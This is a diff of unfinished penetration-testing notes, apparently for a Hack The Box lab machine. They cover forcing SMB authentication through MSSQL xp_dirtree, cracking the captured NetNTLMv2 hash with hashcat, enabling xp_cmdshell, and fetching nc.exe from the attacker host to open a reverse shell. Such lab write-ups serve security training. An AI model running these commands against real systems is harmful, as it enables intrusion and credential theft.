@@ -438,10 +438,125 @@ volume
 ```
 - Next, issue the connect to load a file using `xp_dirtree` from an SMB share (that doesn’t exist) on my host:
 ```
-xp_dirtree "\\10.10.14.5\a";
+SQL (QUERIER\reporting  reporting@volume)> exec master.dbo.xp_dirtree"\\10.10.14.5\myshare",1,1;
 ```
-==reume here==
+- Hash captured
+```
+[SMB] NTLMv2-SSP Client   : 10.10.10.125
+[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
+[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:7ca03b544fa996e6:E68B06D1562EA35A7C5612C3DC0EA244:01010000000000008001E1D4591EDB01ED49D4784EA5423E000000000200080051004E003000500001001E00570049004E002D0030004B0036004300530041004500510046005100370004003400570049004E002D0030004B003600430053004100450051004600510037002E0051004E00300050002E004C004F00430041004C000300140051004E00300050002E004C004F00430041004C000500140051004E00300050002E004C004F00430041004C00070008008001E1D4591EDB0106000400020000000800300030000000000000000000000000300000427766C25BC16C877C6FC32F5FF58EC5493309D2982DD8EE543021A516E968D90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000
+```
+
+- Crack the hash - use #Responder log file of captured hash... easier
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.125.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-sandybridge-AMD Ryzen 7 7800X3D 8-Core Processor, 14991/30047 MB (4096 MB allocatable), 6MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+MSSQL-SVC::QUERIER:7ca03b544fa996e6:e68b06d1562ea35a7c5612c3dc0ea244:01010000000000008001e1d4591edb01ed49d4784ea5423e000000000200080051004e003000500001001e00570049004e002d0030004b0036004300530041004500510046005100370004003400570049004e002d0030004b003600430053004100450051004600510037002e0051004e00300050002e004c004f00430041004c000300140051004e00300050002e004c004f00430041004c000500140051004e00300050002e004c004f00430041004c00070008008001e1d4591edb0106000400020000000800300030000000000000000000000000300000427766c25bc16c877c6fc32f5ff58ec5493309d2982dd8ee543021a516e968d90a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000:corporate568
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: MSSQL-SVC::QUERIER:7ca03b544fa996e6:e68b06d1562ea35...000000
+Time.Started.....: Mon Oct 14 17:06:03 2024 (4 secs)
+Time.Estimated...: Mon Oct 14 17:06:07 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2471.5 kH/s (1.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8964096/14344385 (62.49%)
+Rejected.........: 0/8964096 (0.00%)
+Restore.Point....: 8957952/14344385 (62.45%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: correita.54 -> corcant
+Hardware.Mon.#1..: Util: 71%
+
+Started: Mon Oct 14 17:06:03 2024
+Stopped: Mon Oct 14 17:06:08 2024
+```
+- Now we have the creds of `MSSQL-SVC:corporate568`
+
+- Logged in as `MSSQL-SVC`
+```
+┌──(root㉿kali)-[~/Downloads]
+└─# mssqlclient.py QUERIER/MSSQL-SVC@10.10.10.125 -windows-auth
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
+ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+SQL (QUERIER\mssql-svc  dbo@master)> enable_xp_cmdshell
+INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
+output              
+-----------------   
+querier\mssql-svc   
+
+NULL
+```
+
+
+
+
+- ==resume here==
+- using the `xp_cmdshell` let's get a real shell by transferring `nc` over to RHOST so we can catch a shell
+	- `python -m SimpleHTTPServer 80`
+	- `xp_cmdshell "powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\nc.exe http://10.10.14.5/nc.exe"`
+	- `nc -lnvp 443`
+```
+
+```
+- start smb server to use `nc`
+	- `smbserver.py -smb2support a smb/`
+- `xp_cmdshell \\10.10.14.5\a\nc.exe -e cmd.exe 10.10.14.5 443`
+- #rlwrap ? with `nc`?
+	- ==resume here==
 
 # PrivEsc
 [[Privilege Escalation]], [[1_Initial_Enumeration]]
 - escalate to root
+- PowerUp
